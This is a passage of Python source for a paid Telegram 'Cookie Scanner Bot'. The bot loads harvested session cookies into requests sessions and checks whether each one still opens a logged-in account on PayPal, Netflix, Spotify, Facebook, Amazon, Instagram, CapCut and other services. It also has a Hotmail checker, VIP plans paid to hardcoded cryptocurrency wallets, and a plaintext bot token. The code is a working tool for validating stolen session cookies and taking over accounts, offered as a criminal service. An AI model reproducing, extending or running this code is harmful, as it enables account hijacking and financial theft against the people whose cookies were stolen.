            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.capcut.com/',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

        target_url = "https://www.capcut.com/my-edit?from_page=landing_page&start_tab=video"
        response = session.get(target_url, headers=headers, timeout=15, allow_redirects=True)

        status_code = response.status_code
        final_url = response.url
        html_content = response.text

        if final_url == 'https://www.capcut.com' or final_url == 'https://www.capcut.com/':
            return {
                'status': 'dead',
                'message': 'Cookie DEAD - Redirected to homepage',
                'final_url': final_url,
                'status_code': status_code
            }

        import re
        plan = 'Unknown'
        pattern = r'subscribe_info["\\\s]*:["\\\s]*\{["\\\s]*flag["\\\s]*:["\\\s]*(true|false)'
        match = re.search(pattern, html_content)

        if match:
            subscribe_flag = match.group(1)
            plan = 'Pro' if subscribe_flag == 'true' else 'Free'

        if status_code == 200 and ('my-edit' in final_url or '/my-edit' in html_content):
            return {
                'status': 'success',
                'message': f'Cookie LIVE - {plan} Plan',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': f'Plan: {plan}'
            }
        else:
            return {
                'status': 'unknown',
                'message': f'Unexpected response (Status: {status_code})',
                'final_url': final_url,
                'status_code': status_code
            }

    except requests.exceptions.Timeout:
        return {
            'status': 'unknown',
            'message': 'Timeout occurred while testing CapCut cookies',
            'final_url': 'N/A',
            'status_code': 'Timeout'
        }
    except Exception as e:
        return {
            'status': 'unknown',
            'message': f'Error testing CapCut login: {str(e)}',
            'final_url': 'N/A',
            'status_code': 'Error'
        }

def test_paypal_login(cookies):
    #make by @m3l0d1x
    try:
        session = requests.Session()
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(
                cookie['name'],
                cookie['value'],
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.paypal.com/',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        target_url = "https://www.paypal.com/myaccount/profile/"
        response = session.get(target_url, headers=headers, timeout=15, allow_redirects=True)
        
        status_code = response.status_code
        final_url = response.url
        
        if '/signin' in final_url.lower() or 'signin?returnUri' in final_url.lower():
            return {
                'status': 'dead',
                'message': 'Cookie DEAD - Redirected to signin page',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': 'Status: DEAD - Redirected to login'
            }
        
        if status_code == 200 and '/myaccount/profile' in final_url.lower():
            return {
                'status': 'success',
                'message': 'Cookie LIVE - Access to profile page',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': 'Status: LIVE - On profile page'
            }
        else:
            return {
                'status': 'unknown',
                'message': f'Unexpected response (Status: {status_code})',
                'final_url': final_url,
                'status_code': status_code
            }
            
    except requests.exceptions.Timeout:
        return {
            'status': 'unknown',
            'message': 'Timeout occurred while testing PayPal cookies',
            'final_url': 'N/A',
            'status_code': 'Timeout'
        }
    except Exception as e:
        return {
            'status': 'unknown',
            'message': f'Error testing PayPal login: {str(e)}',
            'final_url': 'N/A',
            'status_code': 'Error'
        }


SCAN_TARGETS = {
    #make by @m3l0d1x
    "netflix": {
        "url": "https://www.netflix.com/account/membership",
        "contains": "Account",
        "domains": [".netflix.com", "netflix.com", ".netflix.net", "netflix.net"]
    },
    "spotify": {
        "url": "https://www.spotify.com/mx-en/account/subscription/manage/",
        "contains": "Account",
        "domains": [".spotify.com", "spotify.com", ".spotify.net", "spotify.net"]
    },
    "tiktok": {
        "url": "https://www.tiktok.com/setting",
        "contains": "Settings",
        "domains": [".tiktok.com", "tiktok.com", "www.tiktok.com", ".byteoversea.com", "byteoversea.com", ".musical.ly", "musical.ly", ".tiktokcdn.com", "tiktokcdn.com"]
    },
    "facebook": {
        "url": "https://www.facebook.com/settings",
        "contains": "Settings",
        "domains": [".facebook.com", "facebook.com", "www.facebook.com"]
    },
    "canva": {
        "url": "https://www.canva.com/settings/billing-and-teams",
        "contains": "billing",
        "domains": [".canva.com", ".www.canva.com", "www.canva.com", "canva.com"]
    },
    "roblox": {
        "url": "https://www.roblox.com/vi/home",
        "contains": "home",
        "domains": [".roblox.com", "roblox.com", "www.roblox.com"]
    },
    "instagram": {
        "url": "https://www.instagram.com/accounts/edit/",
        "contains": "edit",
        "domains": [".instagram.com", "instagram.com", "www.instagram.com"]
    },
    "youtube": {
        "url": "https://www.youtube.com/account",
        "contains": "account",
        "domains": [".youtube.com", "youtube.com", "www.youtube.com"]
    },
    "linkedin": {
        "url": "https://www.linkedin.com/mypreferences/d/categories/account",
        "contains": "mypreferences",
        "domains": [".linkedin.com", "linkedin.com", "www.linkedin.com", ".www.linkedin.com"]
    },
    "amazon": {
        "url": "https://www.amazon.com/gp/your-account/order-history?ref_=ya_d_c_yo",
        "contains": "order-history",
        "domains": [".amazon.com", "amazon.com", "www.amazon.com"]
    },
    "wordpress": {
        "url": "https://wordpress.com/me/",
        "contains": "me",
        "domains": [".public-api.wordpress.com", ".wordpress.com", "wordpress.com"]
    },
    "capcut": {
        "url": "https://www.capcut.com/profile",
        "contains": "profile",
        "domains": [".capcut.com", "www.capcut.com"]
    },
    "paypal": {
        "url": "https://www.paypal.com/myaccount/profile/",
        "contains": "profile",
        "domains": [".paypal.com", "www.paypal.com", "paypal.com"]
    }
}
SERVICE_TEST_FUNCTIONS = {
    'netflix': test_netflix_login,
    'spotify': test_spotify_login,
    'tiktok': test_tiktok_login,
    'facebook': test_facebook_login,
    'canva': test_canva_login,
    'roblox': test_roblox_login,
    'instagram': test_instagram_login,
    'youtube': test_youtube_login,
    'linkedin': test_linkedin_login,
    'amazon': test_amazon_login,
    'wordpress': test_wordpress_login,
    'capcut': test_capcut_login,
    'paypal': test_paypal_login
}

SERVICES = {
    'netflix': 'Netflix',
    'spotify': 'Spotify',
    'tiktok': 'TikTok',
    'facebook': 'Facebook',
    'canva': 'Canva',
    'roblox': 'Roblox',
    'instagram': 'Instagram',
    'youtube': 'YouTube',
    'linkedin': 'LinkedIn',
    'amazon': 'Amazon',
    'wordpress': 'WordPress',
    'capcut': 'CapCut',
    'paypal': 'PayPal'
}

PAYMENT_ACCOUNTS = {
    'ltc': 'ltc1qye4uwhcqkyrs2vry5qtk3dre72dwx2v39k3pc2',
    'usdt_trc20': 'TQzi2ZVz7zuNgJzaKboFucjKMAjvSLY9Lf'
}

BOT_TOKEN = "8132478896:AAF_0-b-1NYCAZK_eV3TRu4ZzQAzpzwY6TU"
ADMIN_USER_ID = "6557052839"
ALLOWED_GROUP_CHAT_IDS = ["-1003103353083", "-1003409275815", "-1003537292759"]
CHANNEL_INVITE_LINK = os.environ.get("CHANNEL_INVITE_LINK", "https://t.me/+-XbtP90HxSE1ZjE1")
PRIVATE_BLOCK_MESSAGE = "You must join our channel chat to use the bot."

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

users_db_path = "users_db.json"
if not os.path.exists(users_db_path):
    with open(users_db_path, "w", encoding="utf-8") as f:
        json.dump({}, f)

with open(users_db_path, "r", encoding="utf-8") as f:
    try:
        users_db = json.load(f)
    except json.JSONDecodeError:
        users_db = {}

NORMAL_PLAN_LIMIT = 30
NORMAL_PLAN_RESET_HOURS = 24

daily_stats_path = "daily_stats.json"
if not os.path.exists(daily_stats_path):
    with open(daily_stats_path, "w", encoding="utf-8") as f:
        json.dump({"date": datetime.now().strftime("%Y-%m-%d"), "scans": 0}, f)

with open(daily_stats_path, "r", encoding="utf-8") as f:
    try:
        daily_stats = json.load(f)
    except json.JSONDecodeError:
        daily_stats = {"date": datetime.now().strftime("%Y-%m-%d"), "scans": 0}

keys_db_path = "keys_db.json"
if not os.path.exists(keys_db_path):
    with open(keys_db_path, "w", encoding="utf-8") as f:
        json.dump({}, f)

with open(keys_db_path, "r", encoding="utf-8") as f:
    try:
        keys_db = json.load(f)
    except json.JSONDecodeError:
        keys_db = {}

def save_users_db():
    with open(users_db_path, "w", encoding="utf-8") as f:
        json.dump(users_db, f, ensure_ascii=False, indent=2)

def save_daily_stats():
    with open(daily_stats_path, "w", encoding="utf-8") as f:
        json.dump(daily_stats, f, ensure_ascii=False, indent=2)

def save_keys_db():
    with open(keys_db_path, "w", encoding="utf-8") as f:
        json.dump(keys_db, f, ensure_ascii=False, indent=2)

def reset_daily_stats_if_needed():
    today = datetime.now().strftime("%Y-%m-%d")
    if daily_stats.get("date") != today:
        daily_stats["date"] = today
        daily_stats["scans"] = 0
        save_daily_stats()

def increment_daily_scans(count):
    reset_daily_stats_if_needed()
    daily_stats["scans"] += count
    save_daily_stats()

def is_registered(user_id):
    user_id_str = str(user_id)
    return user_id_str in users_db and users_db[user_id_str].get('registered', False)

def get_user_record(user_id, username=None, first_name=None):
    """Lấy thông tin user và cập nhật username nếu có"""
    user_id_str = str(user_id)
    changed = False
    if user_id_str not in users_db:
        users_db[user_id_str] = {
            'registered': False,
            'plan': 'normal',
            'file_count': 0,
            'last_reset': datetime.now().isoformat(),
            'vip_expiry': None,
            'vip_start': None,
            'join_date': None,
            'username': None,
            'first_name': None
        }
        changed = True
    data = users_db[user_id_str]
    if username is not None and data.get('username') != username:
        data['username'] = username
        changed = True
    elif username is None and data.get('username') is None:
        pass
    if first_name is not None and data.get('first_name') != first_name:
        data['first_name'] = first_name
        changed = True
    if ADMIN_USER_ID and user_id_str == ADMIN_USER_ID:
        if data.get('plan') != 'vip' or data.get('vip_expiry') is not None or data.get('vip_start') is not None:
            data['plan'] = 'vip'
            data['vip_expiry'] = None
            data['vip_start'] = None
            changed = True
    else:
        if data.get('plan') == 'vip' and data.get('vip_expiry'):
            expiry_date = datetime.fromisoformat(data['vip_expiry'])
            if datetime.now() > expiry_date:
                data['plan'] = 'normal'
                data['vip_expiry'] = None
                data['vip_start'] = None
                changed = True
    if changed:
        save_users_db()
    return data

def find_user_by_username(username):
    """Tìm user_id từ username trong database"""
    username_clean = username.lstrip('@').lower()
    for user_id_str, data in users_db.items():
        stored_username = data.get('username', '')
        if stored_username and stored_username.lower() == username_clean:
            return int(user_id_str)
    return None

def is_restricted_private(user_id, chat_id):
    """Kiểm tra xem user có bị hạn chế sử dụng bot ở chat riêng tư không.
    Chỉ admin (nếu có) hoặc VIP plan mới được sử dụng bot ở chat riêng tư.
    Normal plan bị chặn ở chat riêng tư.
    """

    if chat_id and str(chat_id).startswith("-"):
        return False
    
    if not chat_id:
        return False
    
    if ADMIN_USER_ID and str(ADMIN_USER_ID).strip() and str(user_id) == str(ADMIN_USER_ID).strip():
        return False
    
    user_data = get_user_record(user_id)
    plan = user_data.get('plan', 'normal')
    
    if plan == 'vip':
        vip_expiry = user_data.get('vip_expiry')
        if vip_expiry:
            try:
                expiry_date = datetime.fromisoformat(vip_expiry)
                if datetime.now() > expiry_date:
                    return True 
            except (ValueError, TypeError):
                pass
        return False
    return True

def can_user_scan(user_id):
    user_data = get_user_record(user_id)
    if ADMIN_USER_ID and str(user_id) == ADMIN_USER_ID:
        return True, ""
    
    if user_data['plan'] == 'vip':
        vip_expiry = user_data.get('vip_expiry')
        if vip_expiry:
            try:
                expiry_date = datetime.fromisoformat(vip_expiry)
                if datetime.now() > expiry_date:
                    return False, "Your VIP plan has expired. Please renew to continue scanning."
            except (ValueError, TypeError):

                pass
        return True, ""
    last_reset = datetime.fromisoformat(user_data['last_reset'])
    if datetime.now() - last_reset > timedelta(hours=NORMAL_PLAN_RESET_HOURS):
        user_data['file_count'] = 0
        user_data['last_reset'] = datetime.now().isoformat()
        save_users_db()
    if user_data['file_count'] >= NORMAL_PLAN_LIMIT:
        reset_time = last_reset + timedelta(hours=NORMAL_PLAN_RESET_HOURS)
        remaining = reset_time - datetime.now()
        hours = int(remaining.total_seconds() // 3600)
        minutes = int((remaining.total_seconds() % 3600) // 60)
        return False, f"You have used all {NORMAL_PLAN_LIMIT} scan attempts. Please wait {hours} hours {minutes} minutes to reset or upgrade to VIP!"
    return True, ""

def increment_file_count(user_id):
    user_data = get_user_record(user_id)
    user_data['file_count'] += 1
    save_users_db()

def set_vip_with_duration(user_id, days):
    user_id_str = str(user_id)
    if user_id_str not in users_db:
        return False
    expiry_date = datetime.now() + timedelta(days=days)
    now = datetime.now().isoformat()
    users_db[user_id_str]['plan'] = 'vip'
    users_db[user_id_str]['vip_expiry'] = expiry_date.isoformat()
    users_db[user_id_str]['vip_start'] = now
    users_db[user_id_str]['file_count'] = 0
    save_users_db()
    return True

def generate_random_key():
    segments = []
    for _ in range(4):
        segment = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
        segments.append(segment)
    return '-'.join(segments)

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    if 'hour' in duration_str or 'hours' in duration_str or 'h' in duration_str:
        hours = int(''.join(filter(str.isdigit, duration_str)) or 1)
        return timedelta(hours=hours)
    elif 'day' in duration_str or 'days' in duration_str or 'd' in duration_str:
        days = int(''.join(filter(str.isdigit, duration_str)) or 1)
        return timedelta(days=days)
    elif 'week' in duration_str or 'weeks' in duration_str or 'w' in duration_str:
        weeks = int(''.join(filter(str.isdigit, duration_str)) or 1)
        return timedelta(weeks=weeks)
    elif 'month' in duration_str or 'months' in duration_str or 'm' in duration_str:
        months = int(''.join(filter(str.isdigit, duration_str)) or 1)
        return timedelta(days=months * 30)
    else:
        hours = int(''.join(filter(str.isdigit, duration_str)) or 1)
        return timedelta(hours=hours)

def format_duration(delta):
    total_seconds = int(delta.total_seconds())
    days = total_seconds // 86400
    hours = (total_seconds % 86400) // 3600
    minutes = (total_seconds % 3600) // 60
    
    parts = []
    if days > 0:
        parts.append(f"{days} day{'s' if days > 1 else ''}")
    if hours > 0:
        parts.append(f"{hours} hour{'s' if hours > 1 else ''}")
    if minutes > 0 and days == 0:
        parts.append(f"{minutes} minute{'s' if minutes > 1 else ''}")
    
    return " ".join(parts) if parts else "0 minutes"

def create_key(duration_str, max_users, created_by):
    key = generate_random_key()
    duration = parse_duration(duration_str)
    expiry_date = datetime.now() + duration
    
    keys_db[key] = {
        'key': key,
        'duration': duration_str,
        'duration_seconds': int(duration.total_seconds()),
        'max_users': int(max_users),
        'created_by': str(created_by),
        'created_at': datetime.now().isoformat(),
        'expires_at': expiry_date.isoformat(),
        'activated_by': []
    }
    save_keys_db()
    return key

def activate_key(key, user_id, username, first_name):
    if key not in keys_db:
        return False, "Invalid or non-existent key."
    
    key_data = keys_db[key]
    
    expires_at = datetime.fromisoformat(key_data['expires_at'])
    if datetime.now() > expires_at:
        return False, "Key has expired."
    
    user_id_str = str(user_id)
    activated_by = key_data['activated_by']
    for activation in activated_by:
        if activation.get('user_id') == user_id_str:
            return False, "You have already used this key."
    
    if len(activated_by) >= key_data['max_users']:
        return False, "Key is full, cannot activate."
    
    user_data = get_user_record(user_id, username=username, first_name=first_name)
    if not user_data.get('registered'):
        users_db[user_id_str]['registered'] = True
        users_db[user_id_str]['join_date'] = datetime.now().isoformat()
        save_users_db()
    
    activation_info = {
        'user_id': user_id_str,
        'username': username or 'N/A',
        'first_name': first_name or 'N/A',
        'activated_at': datetime.now().isoformat()
    }
    activated_by.append(activation_info)
    key_data['activated_by'] = activated_by
    
    duration = timedelta(seconds=key_data['duration_seconds'])
    days = duration.days + (1 if duration.seconds > 0 else 0)
    set_vip_with_duration(user_id, days)
    
    save_keys_db()
    
    remaining = key_data['max_users'] - len(activated_by)
    is_full = remaining == 0
    
    return True, {
        'key': key,
        'remaining': remaining,
        'max_users': key_data['max_users'],
        'is_full': is_full,
        'activation_info': activation_info
    }

async def show_start_login(update: Update = None, query=None):
    user = None
    chat_id = None
    if update:
        user = update.effective_user
        chat = update.effective_chat
        chat_id = chat.id if chat else None
    elif query:
        user = query.from_user
        chat_id = query.message.chat.id if query.message else None

    if chat_id and str(chat_id).startswith("-"):
        return
    
    if user and chat_id is not None and is_restricted_private(user.id, chat_id):
        keyboard = [[InlineKeyboardButton("Join Channel Chat", url=CHANNEL_INVITE_LINK)],
                    [InlineKeyboardButton("Contact Owner", url="https://t.me/TSP1K33")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = (
            "Your current plan is Normal.\n\n"
            "To use this bot in private chat, please contact the owner to buy VIP\n"
            "or join our channel chat to use the bot for free."
        )
        if query:
            await safe_edit_message_text(query, text, reply_markup=reply_markup)
        elif update:
            await update.message.reply_text(text, reply_markup=reply_markup)
        return

    registered = user is not None and is_registered(user.id)
    if registered:
        keyboard = [
            [InlineKeyboardButton("Services List", callback_data="services_list"),
             InlineKeyboardButton("Scan All Services", callback_data="scan_all")],
            [InlineKeyboardButton("Hotmail Checker", callback_data="hotmail_checker")],
            [InlineKeyboardButton("Check Plan", callback_data="check_plan"),
             InlineKeyboardButton("Buy VIP", callback_data="buy_vip")]
        ]
        if ADMIN_USER_ID and user and str(user.id) == ADMIN_USER_ID:
            keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = "Cookie Scanner Bot Menu\n\nChoose an option:"
    else:
        keyboard = [[InlineKeyboardButton("Create Account", callback_data="create_account")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = "Welcome\n\nTap Create Account to continue."

    if query:
        await safe_edit_message_text(query, text, reply_markup=reply_markup)
    elif update:
        await update.message.reply_text(text, reply_markup=reply_markup)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    chat_id = chat.id if chat else None
    is_group_chat = chat_id and str(chat_id).startswith("-")
    
    if user:
        get_user_record(user.id, username=user.username, first_name=user.first_name)

    if user and chat_id is not None:
        if is_group_chat:
            if str(chat_id) not in ALLOWED_GROUP_CHAT_IDS and (not ADMIN_USER_ID or str(user.id) != ADMIN_USER_ID):
                await update.message.reply_text("Only admin can use this bot in group chats.")
                return
            keyboard = [
                [InlineKeyboardButton("Services List", callback_data="services_list"),
                 InlineKeyboardButton("Scan All Services", callback_data="scan_all")],
                [InlineKeyboardButton("Hotmail Checker", callback_data="hotmail_checker")],
                [InlineKeyboardButton("Check Plan", callback_data="check_plan"),
                 InlineKeyboardButton("Buy VIP", callback_data="buy_vip")]
            ]
            if ADMIN_USER_ID and str(user.id) == ADMIN_USER_ID:
                keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("Cookie Scanner Bot Menu\n\nChoose an option:", reply_markup=reply_markup)
            return
        else:

            if is_restricted_private(user.id, chat_id):
                keyboard = [
                [InlineKeyboardButton("Contact Owner", url="https://t.me/TSP1K33")],
                [InlineKeyboardButton("Join Channel Chat", url="https://t.me/+IDNwVF4Ue1AyOTVl")]
            ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                text = (
                    "Your current plan is Normal.\n\n"
                    "To use this bot in private chat, please contact the owner to buy VIP\n"
                    "or join our channel chat to use the bot for free."
                )
                await update.message.reply_text(text, reply_markup=reply_markup)
                return

    await show_start_login(update=update)

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or not is_registered(user.id):
        chat = update.effective_chat
        chat_id = chat.id if chat else None
        is_group_chat = chat_id and str(chat_id).startswith("-")
        if is_group_chat and str(chat_id) in ALLOWED_GROUP_CHAT_IDS:
            keyboard = [
                [InlineKeyboardButton("Services List", callback_data="services_list"),
                 InlineKeyboardButton("Scan All Services", callback_data="scan_all")],
                [InlineKeyboardButton("Hotmail Checker", callback_data="hotmail_checker")],
                [InlineKeyboardButton("Check Plan", callback_data="check_plan"),
                 InlineKeyboardButton("Buy VIP", callback_data="buy_vip")]
            ]
            if ADMIN_USER_ID and str(user.id) == ADMIN_USER_ID:
                keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("Cookie Scanner Bot Menu\n\nChoose an option:", reply_markup=reply_markup)
            return
        await show_start_login(update=update)
        return
    user_id = user.id
    chat = update.effective_chat
    chat_id = chat.id if chat else None
    is_group_chat = chat_id and str(chat_id).startswith("-")
    
    if not is_group_chat and chat_id is not None and is_restricted_private(user_id, chat_id):
        keyboard = [[InlineKeyboardButton("Join Channel Chat", url=CHANNEL_INVITE_LINK)],
                    [InlineKeyboardButton("Back", callback_data="back_start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(PRIVATE_BLOCK_MESSAGE, reply_markup=reply_markup)
        return
    
    user_data = get_user_record(user_id, username=user.username, first_name=user.first_name)
    keyboard = [
        [InlineKeyboardButton("Services List", callback_data="services_list"),
         InlineKeyboardButton("Scan All Services", callback_data="scan_all")],
        [InlineKeyboardButton("Hotmail Checker", callback_data="hotmail_checker")],
        [InlineKeyboardButton("Check Plan", callback_data="check_plan"),
         InlineKeyboardButton("Buy VIP", callback_data="buy_vip")]
    ]
    if ADMIN_USER_ID and str(user.id) == ADMIN_USER_ID:
        keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Cookie Scanner Bot Menu\n\nChoose an option:", reply_markup=reply_markup)

async def check_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or not is_registered(user.id):
        await show_start_login(update=update)
        return
    user_id = user.id
    chat = update.effective_chat
    chat_id = chat.id if chat else None
    is_group_chat = chat_id and str(chat_id).startswith("-")
    
    if not is_group_chat and chat_id is not None and is_restricted_private(user_id, chat_id):
        keyboard = [[InlineKeyboardButton("Join Channel Chat", url=CHANNEL_INVITE_LINK)],
                    [InlineKeyboardButton("Back", callback_data="back_start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(PRIVATE_BLOCK_MESSAGE, reply_markup=reply_markup)
        return
    user_data = get_user_record(user_id, username=user.username, first_name=user.first_name)
    plan_text = "VIP" if user_data['plan'] == 'vip' else "Normal"
    used_files = user_data['file_count']
    max_files = "Unlimited" if user_data['plan'] == 'vip' else NORMAL_PLAN_LIMIT
    vip_info = ""
    if user_data['plan'] == 'vip' and user_data.get('vip_expiry'):
        expiry_date = datetime.fromisoformat(user_data['vip_expiry'])
        remaining = expiry_date - datetime.now()
        if remaining.total_seconds() > 0:
            days = remaining.days
            hours = int(remaining.seconds // 3600)
            vip_info = f"\nVIP expires in: {days} days {hours} hours"
        else:
            vip_info = "\nVIP expired"
    if user_data['plan'] == 'normal':
        last_reset = datetime.fromisoformat(user_data['last_reset'])
        next_reset = last_reset + timedelta(hours=NORMAL_PLAN_RESET_HOURS)
        remaining = next_reset - datetime.now()
        hours = int(remaining.total_seconds() // 3600)
        minutes = int((remaining.total_seconds() % 3600) // 60)
        reset_info = f"\nReset in: {hours} hours {minutes} minutes"
    else:
        reset_info = ""
    keyboard = [
        [InlineKeyboardButton("Contact Owner", url="https://t.me/TSP1K33"),InlineKeyboardButton("Buy VIP Plan", callback_data="buy_vip")],
        [InlineKeyboardButton("Back", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    message = f"""Your Plan Information:

Plan: {plan_text}
Used: {used_files}/{max_files} files{vip_info}{reset_info}

VIP Plan Pricing:
• 1 Week: 50,000 VND- 3,79 USDT 
• 3 Weeks: 120,000 VND - 5,69 USDT  
• 1 Month: 150,000 VND - 7,59 USDT 

Contact Owner @TSP1K33 to upgrade!"""
    if update.callback_query:
        await safe_edit_message_text(update.callback_query, message, reply_markup=reply_markup)
    else:
        await update.message.reply_text(message, reply_markup=reply_markup)

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user or (update.callback_query.from_user if update.callback_query else None)
    if not user or not ADMIN_USER_ID or str(user.id) != ADMIN_USER_ID:
        await (update.callback_query.message if update.callback_query else update.message).reply_text("You don't have permission to use this command!")
        return
    total_users = len(users_db)
    normal_users = sum(1 for u in users_db.values() if u.get('plan') == 'normal')
    vip_users = sum(1 for u in users_db.values() if u.get('plan') == 'vip')
    total_scans = sum(u.get('file_count', 0) for u in users_db.values())
    expiring_vip = 0
    for u in users_db.values():
        if u.get('plan') == 'vip' and u.get('vip_expiry'):
            expiry_date = datetime.fromisoformat(u['vip_expiry'])
            if expiry_date - datetime.now() < timedelta(days=7):
                expiring_vip += 1
    header = f"{'User ID':<15}{'@Username':<20}{'Plan':<8}{'VIP Expiry':<20}"
    lines = [header, "-"*len(header)]
    
    bot = context.bot if context else None
    
    for uid, data in users_db.items():
        plan = data.get('plan','')
        expiry = data.get('vip_expiry') or "-"
        if expiry != "-":
            expiry = datetime.fromisoformat(expiry).strftime("%Y-%m-%d %H:%M")
        
        username = data.get('username')
        
        if not username and bot:
            user_id_int = int(uid)
            username_found = False
            
            try:
                chat_member = await bot.get_chat(user_id_int)
                if chat_member.username:
                    username = chat_member.username
                    username_found = True
                    data['username'] = username
                    if chat_member.first_name:
                        data['first_name'] = chat_member.first_name
                    save_users_db()
            except Exception:
                pass
            
            if not username_found:
                try:
                    for group_id in ALLOWED_GROUP_CHAT_IDS:
                        try:
                            chat_member = await bot.get_chat_member(int(group_id), user_id_int)
                            if chat_member.user.username:
                                username = chat_member.user.username
                                username_found = True
                                data['username'] = username
                                if chat_member.user.first_name:
                                    data['first_name'] = chat_member.user.first_name
                                save_users_db()
                                break
                        except Exception:
                            continue
                except Exception:
                    pass
            
            if not username_found:
                try:
                    if update and update.effective_chat:
                        chat = update.effective_chat
                        if chat.id and str(chat.id).startswith("-"):
                            try:
                                chat_member = await bot.get_chat_member(chat.id, user_id_int)
                                if chat_member.user.username:
                                    username = chat_member.user.username
                                    username_found = True
                                    data['username'] = username
                                    if chat_member.user.first_name:
                                        data['first_name'] = chat_member.user.first_name
                                    save_users_db()
                            except Exception:
                                pass
                except Exception:
                    pass
        
        if username:
            username = f"@{username}"
        else:
            username = "N/A"
        lines.append(f"{uid:<15}{username:<20}{plan:<8}{expiry:<20}")
    table = "\n".join(lines)
    message = f"""System Statistics:

Total users: {total_users}
Normal users: {normal_users}
VIP users: {vip_users}
Total scans: {total_scans}
VIP expiring soon (7d): {expiring_vip}

{table}"""
    await (update.callback_query.message if update.callback_query else update.message).reply_text(message)

async def admin_set_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or not ADMIN_USER_ID or str(user.id) != ADMIN_USER_ID:
        await update.message.reply_text("You don't have permission to use this command!")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /setvip <user_id> <days>")
        return
    target_id = int(args[0])
    days = int(args[1])
    
    username = None
    first_name = None
    if context.bot:
        try:
            chat_member = await context.bot.get_chat(target_id)
            username = chat_member.username
            first_name = chat_member.first_name
        except Exception:
            pass
    
    if username or first_name:
        get_user_record(target_id, username=username, first_name=first_name)
    
    if set_vip_with_duration(target_id, days):
        username_display = f"@{username}" if username else f"ID {target_id}"
        await update.message.reply_text(f"Set VIP for user {username_display} (ID: {target_id}) for {days} days.")
    else:
        await update.message.reply_text("Failed to set VIP. User not found.")

async def admin_del_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or not ADMIN_USER_ID or str(user.id) != ADMIN_USER_ID:
        await update.message.reply_text("You don't have permission to use this command!")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /delvip <user_id> or /delvip @username")
        return
    
    target_input = args[0].strip()
    target_id = None
    
    if target_input.startswith('@'):
        target_id = find_user_by_username(target_input)
        if not target_id:
            try:
                chat_member = await context.bot.get_chat(target_input)
                target_id = chat_member.id
            except Exception:
                await update.message.reply_text(f"User @{target_input.lstrip('@')} not found in database or Telegram.")
                return
    else:
        try:
            target_id = int(target_input)
        except ValueError:
            await update.message.reply_text("Invalid user ID. Use numeric ID or @username format.")
            return
    
    target_id_str = str(target_id)
    if target_id_str in users_db:
        username = users_db[target_id_str].get('username', '')
        username_display = f"@{username}" if username else f"ID {target_id}"
        users_db[target_id_str]['plan'] = 'normal'
        users_db[target_id_str]['vip_expiry'] = None
        users_db[target_id_str]['vip_start'] = None
        save_users_db()
        await update.message.reply_text(f"Removed VIP from user {username_display} (ID: {target_id}).")
    else:
        await update.message.reply_text(f"User {target_input} not found in database.")

async def admin_get_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or not ADMIN_USER_ID or str(user.id) != ADMIN_USER_ID:
        await update.message.reply_text("You don't have permission to use this command!")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /getkey <duration> <max_users>\nExample: /getkey 1hours 1 or /getkey 1day 5")
        return
    
    last_arg = args[-1]
    try:
        max_users = int(last_arg)
        if max_users <= 0:
            await update.message.reply_text("Max users must be greater than 0.")
            return
    except ValueError:
        await update.message.reply_text("Max users must be a number.")
        return
    
    duration_str = ' '.join(args[:-1])
    
    try:
        key = create_key(duration_str, max_users, user.id)
        duration_delta = parse_duration(duration_str)
        duration_formatted = format_duration(duration_delta)
        message = (
            "┌── ⋆⋅☆⋅⋆ ── KEY BOT CHECKER ── ⋆⋅☆⋅⋆ ──┐\n\n"
            "   ░▒▓█ KEY CREATED SUCCESSFULLY █▓▒░\n\n"
            f"   ⫸ Key: {key}\n"
            f"   ⫸ Duration: {duration_formatted}\n"
            f"   ⫸ Max Users: {max_users}\n\n"
